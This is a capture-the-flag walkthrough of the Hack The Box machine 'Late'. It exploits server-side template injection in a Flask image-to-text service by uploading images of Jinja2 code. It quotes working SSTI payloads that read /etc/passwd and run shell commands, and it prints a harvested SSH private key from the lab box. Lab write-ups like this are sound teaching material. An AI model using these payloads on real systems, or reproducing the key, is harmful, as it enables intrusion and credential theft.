# Late

**Date**: 22/05/2022

**Difficulty**: EASY

**CTF**: [https://app.hackthebox.com/machines/Late](https://app.hackthebox.com/machines/Late)

---

# Recognizance Phase

Let’s start sending a ping to the target IP:

<figure><img src="../../.gitbook/assets/late0.png" alt=""><figcaption></figcaption></figure>

We receive the ping back and we can see that ttl value is 63, so the target machine is a linux.

Let’s scan all TCP ports of the target IP machine and see which ones are open:

<figure><img src="../../.gitbook/assets/late1.png" alt=""><figcaption></figcaption></figure>

It reports us 2 open ports: 22 (probably ssh) and 80 (probably http).

Let’s run some basic enumeration scripts to detect the services and their versions that are running in these ports:

<figure><img src="../../.gitbook/assets/late2.png" alt=""><figcaption></figcaption></figure>

The port 22 is running OpenSSH 7.6p1. If we do a quick search of that version on launchpad:

<figure><img src="../../.gitbook/assets/late3.png" alt=""><figcaption></figcaption></figure>

We can see that the target machine may be running an ubuntu bionic. We’ll see later if it matches.

The port 80 is running a HTTP service and it appears to be using nginx 1.14.0. Let’s launch a whatweb scan to that service:

<figure><img src="../../.gitbook/assets/late4.png" alt=""><figcaption></figcaption></figure>

At email, we can see that it’s using the domain late.htb, so let’s add it to the /etc/hosts file in our machine:

<figure><img src="../../.gitbook/assets/late5.png" alt=""><figcaption></figcaption></figure>

Now, let’s visit the webpage with the IP and with the domain late.htb to see if there is any difference (in this case the page displayed seems to be the same).

<figure><img src="../../.gitbook/assets/late6.png" alt=""><figcaption></figcaption></figure>

Taking a look to the main webpage I discover a link that redirect us to the subdomain `images.late.htb`: 

<figure><img src="../../.gitbook/assets/late7.png" alt=""><figcaption></figcaption></figure>

Let’s add it to the /etc/hosts file and visit it:

<figure><img src="../../.gitbook/assets/late8.png" alt=""><figcaption></figcaption></figure>

Interesting, it seems to be an online service for converting image to text using a tool named Flask. There is a field where we can select a file of our machine and a button that will start the scan process…

Let’s test it with a valid image with text to see what happens:

<figure><img src="../../.gitbook/assets/late9.png" alt=""><figcaption></figcaption></figure>

i have uploaded a PNG file with the text ”Hi, I’m Angel LM!” and after clicking on SCAN IMAGE button the site asks me to download the results… Let’s see what’s inside:

<figure><img src="../../.gitbook/assets/late10.png" alt=""><figcaption></figcaption></figure>

Pretty close to the text!

Let’s investigate about Flask. According to Wikipedia, Flask is a micro web framework written in Python that allows to create web apps.

As we saw earlier, this app is getting an image, finding the text inside it, and sending us the result in an HTML way `<p> THE RESULT </p>`

Maybe we can inject code as a file, inside the file name or in a image as text.

Let’s use Burp Suite to intercept a petition and see more info:

<figure><img src="../../.gitbook/assets/late11.png" alt=""><figcaption></figcaption></figure>

Apparently it is sending the data image by POST to /scanner.

Let’s try to upload a TXT file to the form.

<figure><img src="../../.gitbook/assets/late12.png" alt=""><figcaption></figcaption></figure>

An error “invalid extension” shows up any time I try to upload any file that hasn’t an image file extension.

What if I change the extension to .jpg, creating a non valid image?

<figure><img src="../../.gitbook/assets/late13.png" alt=""><figcaption></figcaption></figure>

Mmm… there is some information leakage? Apparently there is a user named `svc_acc` in the target machine. The files I send to scanner are being saved in `/home/svc_acc/app/uploads/` folder.

Ok, so there is no way to upload a malicious file. What about injecting the code inside the image? If we create an image of a code that could be executed by the framework we get an RCE and maybe we can get a Reverse Shell after.

I found this interesting article from hacktricks: [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection). 

The first step is to know if there is an Server Side Template Injection (SSTI) vulnerability.

To do so, I prepared this image:

<figure><img src="../../.gitbook/assets/late14.png" alt=""><figcaption></figcaption></figure>

And received this response from the scan web tool:

```bash
<p>49
${7*7}

<%= /*/] %>
S49
#{7*7}
</p>
```

Apparently, the strings `{{7*7}}` are being executed, so it is vulnerable to SSTI. Nice.

Now, let’s do some more checks to identify the template engine.

<figure><img src="../../.gitbook/assets/late15.png" alt=""><figcaption></figcaption></figure>

Apparently, Flash uses Jinja2 by defect, but let’s check it:

<figure><img src="../../.gitbook/assets/late16.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/late17.png" alt=""><figcaption></figcaption></figure>

```bash
<p>7777777
</p>
```

Seems to be Jinja2.

In the hacktricks article, there are some examples of reading remote files exploiting jinja2:

```bash
# ''.__class__.__mro__[2].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

And examples of RCE:

```bash
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

The scanning app doesn’t recognize the text very well and it drop errors everytime I try to upload an image with executable code, and it’s hard to know where it failed. To deal with this, I removed the `{{ }}` from the text and modify the size of the text one time after another until the text I wrote is the same I received.

<figure><img src="../../.gitbook/assets/late18.png" alt=""><figcaption></figcaption></figure>

Monospace 36 with kerning adjustments in some parts.

<figure><img src="../../.gitbook/assets/late19.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/late20.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/late21.png" alt=""><figcaption></figcaption></figure>

I tried to launch a reverse shell in multiples ways: bash, python, netcat… but no one succeded, so I’ll do manual enumeration via SSTI i guess…

<figure><img src="../../.gitbook/assets/late22.png" alt=""><figcaption></figcaption></figure>

```bash
<p>svc_acc

</p>
```

<figure><img src="../../.gitbook/assets/late23.png" alt=""><figcaption></figcaption></figure>

```bash
<p>app
file
user.txt

</p>
```

<figure><img src="../../.gitbook/assets/late24.png" alt=""><figcaption></figcaption></figure>

```bash
<p>total 60
drwxr-xr-x 9 svc_acc svc_acc  4096 May 23 21:11 .
drwxr-xr-x 3 root    root     4096 Jan  5 10:44 ..
drwxrwxr-x 7 svc_acc svc_acc  4096 May 23 21:16 app
lrwxrwxrwx 1 svc_acc svc_acc     9 Jan 16 18:45 .bash_history -&gt; /dev/null
-rw-r--r-- 1 svc_acc svc_acc  3771 Apr  4  2018 .bashrc
drwx------ 3 svc_acc svc_acc  4096 Apr  7 13:51 .cache
drwxr-x--- 3 svc_acc svc_acc  4096 May 23 20:15 .config
-rw-rw-r-- 1 svc_acc svc_acc     0 May 23 20:42 file
drwx------ 4 svc_acc svc_acc  4096 May 23 20:09 .gnupg
drwxrwxr-x 5 svc_acc svc_acc  4096 Jan  5 12:13 .local
-rw-r--r-- 1 svc_acc svc_acc   807 Apr  4  2018 .profile
drwx------ 2 svc_acc svc_acc  4096 May 23 20:04 .ssh
-rw-r----- 1 root    svc_acc    33 May 23 19:12 user.txt
drwxr-xr-x 2 svc_acc svc_acc  4096 May 23 20:40 .vim
-rw------- 1 svc_acc svc_acc 10192 May 23 21:11 .viminfo

</p>
```

<figure><img src="../../.gitbook/assets/late25.png" alt=""><figcaption></figcaption></figure>

```bash
<p>8374#######################b33

</p>
```

<figure><img src="../../.gitbook/assets/late26.png" alt=""><figcaption></figcaption></figure>

```bash
<p>total 20
drwx------ 2 svc_acc svc_acc 4096 May 23 20:04 .
drwxr-xr-x 9 svc_acc svc_acc 4096 May 23 21:11 ..
-rw-rw-r-- 1 svc_acc svc_acc  394 May 23 20:04 authorized_keys
-rw------- 1 svc_acc svc_acc 1679 Apr  7 11:08 id_rsa
-rw-r--r-- 1 svc_acc svc_acc  394 Apr  7 11:08 id_rsa.pub

</p>
```

```bash
<p>-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
################################################################
0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----

</p>
```

<figure><img src="../../.gitbook/assets/late27.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/late28.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/late29.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/late30.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/late31.png" alt=""><figcaption></figcaption></figure>